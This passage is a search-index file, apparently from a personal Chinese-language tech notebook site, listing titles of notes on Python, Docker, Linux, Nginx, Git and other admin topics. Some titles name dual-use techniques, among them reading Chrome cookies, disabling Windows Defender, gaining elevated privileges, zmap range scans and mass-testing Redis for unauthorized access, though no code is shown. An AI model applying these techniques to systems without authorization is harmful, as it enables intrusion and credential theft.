{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"zjuchenyuan\u2019s Notebook \u00b6 My notebook about technology, for lookup and share \u67e5\u770b\u5185\u5bb9 \u8bf7\u70b9\u51fbTopic\u6807\u9898\uff08\u5982 Docker \uff09\u8fdb\u5165\u9875\u9762\u540e\u4f7f\u7528\u53f3\u4fa7\u76ee\u5f55\u5b9a\u4f4d \u8bc4\u8bba\u8bf7\u4f7f\u7528: Github Issue \u67e5\u770b\u6700\u8fd1\u7684\u66f4\u65b0 Python \u00b6 \u8bed\u8a00\u52fe\u52d2QuickStart \u5b89\u88c5pip \u8bbe\u7f6epip\u6e90 requests\u4f7f\u7528\u591aIP\u8bf7\u6c42 Python\u591a\u7ebf\u7a0b\u6a21\u677f http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584 \u4e0d\u5fc5\u4fee\u6539\u5e93\u6587\u4ef6 \u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898\u89e3\u51b3 pycodestyle\u68c0\u67e5\u4ee3\u7801\u98ce\u683c \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32 \u522b\u5bf9\u5927\u7684list\u5faa\u73af\u4f7f\u7528in\uff0c\u5e94\u8be5\u6539\u7528set \u89e3\u51b3Python.h: No such file or directory \u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u7528requests\u8fdb\u884cpost \u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362 \u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b \u6355\u6349\u7528\u6237\u7684Ctrl+C \u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668 \u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5 \u4f7f\u7528Python\u5f00\u53d1\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u540e\u7aef\u670d\u52a1 \u4fee\u590dgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d Crack RSA! \u7834\u89e3\u77ed\u957f\u5ea6\u5bc6\u94a5\u7684RSA\u52a0\u5bc6 \u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362 \u7528redis\u5b58\u50a8\u5b57\u5178 python selenium+Docker chrome headless\u722c\u590d\u6742\u7f51\u9875 python transmissionrpc \u4e0a\u4f20\u79cd\u5b50 \u83b7\u53d6\u72b6\u6001 \u589e\u52a0tracker \u4fee\u6539torrent\u6587\u4ef6\u4e2d\u7684tracker uwsgi\u4f18\u96c5\u91cd\u542f Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8 \u4f7f\u7528sentry \u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898 Python\u83b7\u53d6Windows Chrome\u7684Cookie Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8 Ubuntu16.04\u5b89\u88c5Python3.7 Python\u4f7f\u7528MongoDB \u589e\u5220\u67e5\u6539 \u6279\u91cf\u8986\u76d6\u63d2\u5165 \u591a\u8868join \u968f\u673a\u91c7\u6837 Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b \u00b6 \u4f5c\u4e1a\u7684\u5e38\u89c1\u9519\u8bef\uff0c\u671f\u672b\u590d\u4e60 gist Python\u4e00\u4e9b\u5e38\u7528\u7684\u4ee3\u7801\u7247\u6bb5 \u00b6 \u8fde\u63a5mysql\u63d2\u5165\u3001\u67e5\u8be2 \u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178 print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4 mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf \u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32 pyaes\u5e93 BASH \u00b6 \u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias \u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a for\u5faa\u73af \u5224\u65ad\u547d\u4ee4\u3001\u6587\u4ef6\u662f\u5426\u5b58\u5728 rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c BAT \u6279\u5904\u7406 \u00b6 \u5feb\u901f\u6253\u5f00cmd \u5e76\u5217\u8bed\u53e5\u8bed\u6cd5 \u5faa\u73affor \u7ed3\u675f\u8fdb\u7a0btaskkill \u5185\u5b58\u6574\u7406free \u7761\u4e00\u4f1aSleepX \u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728 \u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create \u7aef\u53e3\u8f6c\u53d1 \u4fdd\u6301RVPN\u4e0d\u65ad\u5f00 vpn\u9759\u6001\u8def\u7531\u914d\u7f6e \u8fdb\u5165\u4f11\u7720 \u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e\uff0c\u4e0d\u7528\u6253\u5f00IE \u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650 \u547d\u4ee4\u884c\u914d\u7f6eIP \u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt \u547d\u4ee4\u884c\u4e34\u65f6\u5173\u95edWindows Defender \u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP Bitcoin \u00b6 \u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd \u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229 \u5b9e\u65f6\u6536\u76ca\u7387 C \u8bed\u8a00 \u00b6 \u5173\u4e8eDev C++ \u8f93\u5165\u7684\u95ee\u9898\uff0c\u5efa\u8bae\u7528gets\u548csscanf C++\u7528sstream\u4ee3\u66ffsprintf g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898 [\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386 \u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator \u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f \u9898\u76ee\u89e3\u6790 (\u7ed3\u6784\u6307\u9488\u3001\u7ed3\u6784\u6570\u7ec4\u2026) CDN \u00b6 \u00b7UPYUN \u53c8\u62cd\u4e91 \u7ba1\u7406\u6587\u4ef6\u53ef\u4ee5\u7528FTP\uff0cUpyunManager\uff0cUpx python\u89c4\u5219\u5237\u65b0\uff0cpython\u8c03\u7528\u5b98\u65b9API\u8fdb\u884cURL\u5237\u65b0 \u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898 \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd https\u8bc1\u4e66\u66f4\u65b0\u7684\u81ea\u52a8\u5316\u811a\u672c \u8868\u5355\u4e0a\u4f20bash\u5feb\u901f\u8c03\u7528 \u00b7Qiniu \u4e03\u725b \u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939 \u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9 UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42 cURL \u00b6 \u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42 \u57fa\u672c\u6559\u7a0b \u8fd8\u53ef\u4ee5\u5faa\u73af\u54df wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde Developer \u00b6 \u4fdd\u6301\u6280\u672f\u7cbe\u8fdb \u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee \u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247 \u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f \u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba Go\u8bed\u8a00-\u5b89\u88c5 \u5b89\u88c5\u7f3a\u5931\u5e93 Docker \u00b6 myubuntu \u57fa\u7840\u955c\u50cf \u5b89\u88c5 \u52a0\u901f\u955c\u50cf\u4e0b\u8f7d \u65e7\u7248\u672c\u5378\u8f7d \u83b7\u5f97\u5bb9\u5668\u7684ip \u5bfc\u5165\u5bfc\u51fa\u5bb9\u5668 \u89e3\u51b3iptables failed\u95ee\u9898 \u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8 \u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig\u7684\u95ee\u9898 \u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c \u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts \u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e \u5feb\u901f\u90e8\u7f72ftp \u5feb\u901f\u90e8\u7f72wordpress Dockerfile \u4e2d\u7684 apt-get \u9759\u9ed8\u6267\u884c \u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u5feb\u901f\u90e8\u7f72samba [CTF]\u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1 \u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B \u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898 \u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898 \u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b \u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI \u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat \u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d Docker\u4f7f\u752832\u4f4d\u955c\u50cf \u4fee\u6539Docker\u5e95\u5c42\u6587\u4ef6\u4fee\u6539macvlan\u53d8\u66f4\u7f51\u6bb5 \u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694 nsenter\u8fdb\u5165\u5bb9\u5668\u68c0\u67e5\u7f51\u7edc \u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4 \u56fa\u5b9a\u5bb9\u5668\u7684IP Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1 \u79c1\u6709registry\u7684api ETH \u00b6 \u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH \u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740 Python\u53d1\u8d77\u4ea4\u6613(Web3.py) \u5730\u5740\u4ea4\u6613\u67e5\u8be2API Favorites \u00b6 Intel i386 \u624b\u518c \u53ca \u52d8\u8bef ASCII\u5b57\u7b26\u56fe\u6848\u751f\u6210 \u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570 \u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d \u5efa\u8bae\u8bfb\u7684\u8bba\u6587 More Links Git Emoji Flask \u00b6 \u5e94\u7528\u6839\u76ee\u5f55APP_ROOT render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf \u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55 \u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206 \u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6 lazyload \u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c \u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1 \u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf Fuzzing \u00b6 DataFlow Sanitizer \u00b6 Compiling Exiv2 with DFSan (including compile libcxx) Git \u00b6 \u7acb\u5373\u4f7f\u7528 git clone\u52a0\u901f \u2013depth 1 git push\u52a0\u901f git push\u514d\u5bc6\u7801 bash\u5de5\u4f5c\u73af\u5883(\u522b\u540d,\u81ea\u52a8\u5b8c\u6210,dirty\u63d0\u793a)\u8bbe\u7f6e \u597d\u73a9\u7684\u547d\u4ee4\u4eec gitignore\u8d1f\u5411\u9009\u62e9 \u8865\u4e0acommit\u6f0f\u6389\u7684\u6587\u4ef6 \u2013amend \u5bc6\u7801\u6cc4\u9732\u67e5\u4f5c\u8005 blame \u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21\u63d0\u4ea4 add -p \u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539 \u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u \u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d \u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4 GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key \u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93 Github Project Recommendation \u00b6 \u89c6\u9891\u4e0b\u8f7dyou-get \u8bb0\u5fc6\u624b\u6bb5Anki \u5728\u7ebf\u8bc4\u6d4bOnlineJudge Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0bsympy \u8ba9\u7f51\u7ad9\u94fe\u63a5\u79d2\u5f00InstantClick Java \u00b6 \u4e00\u4e9bJava\u4e0eC++\u7684\u4e0d\u540c\u4e4b\u5904 \u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898 JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570 \u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e JavaScript \u00b6 \u4f7f\u7528\u672c\u5730\u5b58\u50a8localStorage \u968f\u673a\u5b57\u7b26\u4e32\u751f\u6210 \u5f02\u5e38 \u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875 jQuery\u7ed1\u5b9a\u201d\u53d8\u4e3a\u53ef\u89c1\u201d\u4e8b\u4ef6 \u8bfb\u53d6GET\u53c2\u6570 \u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55 \u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001 \u4f7f\u7528InstantClick\u8e29\u5751 \u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9 \u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027 \u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8 Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5 \u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6 Jekyll \u00b6 \u78b0\u5230\u8fc7\u7684\u5751 \u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7 \u89e3\u51b3Github Metadata Warning \u5b89\u88c5Jekyll Linux-setup \u00b6 \u7f51\u7edc\u52a0\u901fprivoxy \u914d\u7f6e\u6709\u7ebf\u9759\u6001IP \u4f7f\u7528ifconfig\u4fee\u6539ip\u540e\u8bb0\u5f97\u8981\u91cd\u65b0\u914droute \u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6 \u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP \u9510\u901f\u5b89\u88c5 \u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898 UnixBench\u6027\u80fd\u8bc4\u6d4b \u6e05\u9664\u5185\u5b58\u7f13\u5b58 \u4f7f\u7528iptables\u5c01ip iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3 \u65e0root\u6743\u9650\u4f7f\u7528screen screen\u7684\u7528\u6cd5 \u4e24\u6761iptables\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3 \u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220chattr +i \u65f6\u533a\u8bbe\u7f6e \u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570 \u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237 \u7b80\u5355OpenVPN\u914d\u7f6e \u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e \u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4 \u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a \u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8 /dev/loop0\u6269\u5bb9 \u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8 \u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a \u542f\u7528rc.local Linux-SSH \u00b6 \u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa \u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd ssh\u53cd\u5411\u4ee3\u7406 \u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1 ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu Linux-cli \u00b6 \u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9 grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863 \u5e2e\u52a9\u6587\u672c\u7684grep \u75282>&1 \u5404\u79cd\u89e3\u538b\u547d\u4ee4 \u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22 \u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570 \u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f wget\u6162\u6162\u4e0b\u8f7d touch\u4fee\u6539\u65f6\u95f4\u6233 \u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272 \u6362\u884c\u65b9\u5f0f\u4fee\u6539 iodine\u2013\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e \u8fdc\u7a0b\u63a7\u5236Windows \u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801 \u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f \u5b89\u88c5ffmpeg \u4fee\u6539readonly\u7684\u53d8\u91cf \u6c38\u4e45\u7b49\u5f85 sleep infinity zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3 \u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e \u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a \u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664 \u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26 :set ff=unix watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa \u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1 scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20 \u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09 \u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b \u6279\u91cf\u66ff\u6362\u6587\u672c \u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5 redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c \u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9 coredump in fuzzing bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386 grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9 \u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9 gdb\u81ea\u52a8\u5316 mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6 Linux-backup \u00b6 \u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981 \u7528rsync\u4ee3\u66ffscp \u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd rsync\u5907\u4efd\u5b89\u5353\u624b\u673a MySQL \u00b6 \u67e5\u770b\u8868\u7ed3\u6784 desc MERGE\u5b58\u50a8\u5f15\u64ce \u5220\u9664\u8868\u7684\u5197\u4f59 \u4fee\u6539\u8868 alter table \u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3\u7684\u51fd\u6570 \u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0 \u67e5\u8be2\u4f18\u5316\u2013explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort\uff1b\u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9 \u5185\u5b58\u8868The table is full\u7684\u89e3\u51b3 replace\u51fd\u6570\u66ff\u6362\u6587\u672c \u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57 mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18 \u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4 \u89e3\u51b3 Too many open files \u9519\u8bef \u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898 NULL\u8f6c0 \u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236 Nginx \u00b6 Nginx\u601d\u8003\u9898 \u666e\u901a\u8d44\u6e90\u5141\u8bb8POST \u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c \u83b7\u5f97Let\u2019s encrypt\u514d\u8d39https\u8bc1\u4e66 \u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66 \u914d\u7f6e\u5b89\u5168\u7684https \u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c root\u4e0ealias\u7684\u533a\u522b \u5728bash on win10\u4e0a\u4f7f\u7528Nginx Nginx\u5141\u8bb8\u5217\u76ee\u5f55 \u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668: \u591a\u4e0a\u6e38\u5207\u6362\uff0cSeaweedFS Docker\u90e8\u7f72 proxy_pass \u52a8\u6001\u4ee3\u7406 \u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66 \u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7 PHP \u00b6 \u663e\u793a\u9519\u8bef\u4fe1\u606f \u5168\u9875\u9762iframe RabbitMQ \u00b6 \u4f7f\u7528Docker\u90e8\u7f72 \u4efb\u52a1\u63a8\u9001\u6267\u884c \u4ee3\u7801\u793a\u4f8b Ubuntu\u684c\u9762\u7248 \u00b6 \u5b89\u88c5Google\u62fc\u97f3\u540e\u7528\u4e0a\u4e91\u5019\u9009\u529f\u80fd VirtualBox \u00b6 \u4e0b\u8f7d\u5b89\u88c5\uff0c\u4e00\u5b9a\u8bb0\u5f97\u5b89\u88c5\u989d\u5916\u5305 \u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879 \u542f\u52a8\u865a\u62df\u673a \u8fdc\u7a0b\u63a7\u5236\u865a\u62df\u673a WinSoftware \u00b6 Emeditor Everything Sysinternals Utilities CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668 U\u76d8\u5b89\u88c5\u539f\u7248\u7cfb\u7edf\u76d8 WinRAR BurpSuite BEncode Editor Win10 Windows\u7167\u7247\u67e5\u770b\u5668","title":"Home"},{"location":"#zjuchenyuans-notebook","text":"My notebook about technology, for lookup and share \u67e5\u770b\u5185\u5bb9 \u8bf7\u70b9\u51fbTopic\u6807\u9898\uff08\u5982 Docker \uff09\u8fdb\u5165\u9875\u9762\u540e\u4f7f\u7528\u53f3\u4fa7\u76ee\u5f55\u5b9a\u4f4d \u8bc4\u8bba\u8bf7\u4f7f\u7528: Github Issue \u67e5\u770b\u6700\u8fd1\u7684\u66f4\u65b0","title":"zjuchenyuan's Notebook"},{"location":"#python","text":"\u8bed\u8a00\u52fe\u52d2QuickStart \u5b89\u88c5pip \u8bbe\u7f6epip\u6e90 requests\u4f7f\u7528\u591aIP\u8bf7\u6c42 Python\u591a\u7ebf\u7a0b\u6a21\u677f http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584 \u4e0d\u5fc5\u4fee\u6539\u5e93\u6587\u4ef6 \u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898\u89e3\u51b3 pycodestyle\u68c0\u67e5\u4ee3\u7801\u98ce\u683c \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32 \u522b\u5bf9\u5927\u7684list\u5faa\u73af\u4f7f\u7528in\uff0c\u5e94\u8be5\u6539\u7528set \u89e3\u51b3Python.h: No such file or directory \u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u7528requests\u8fdb\u884cpost 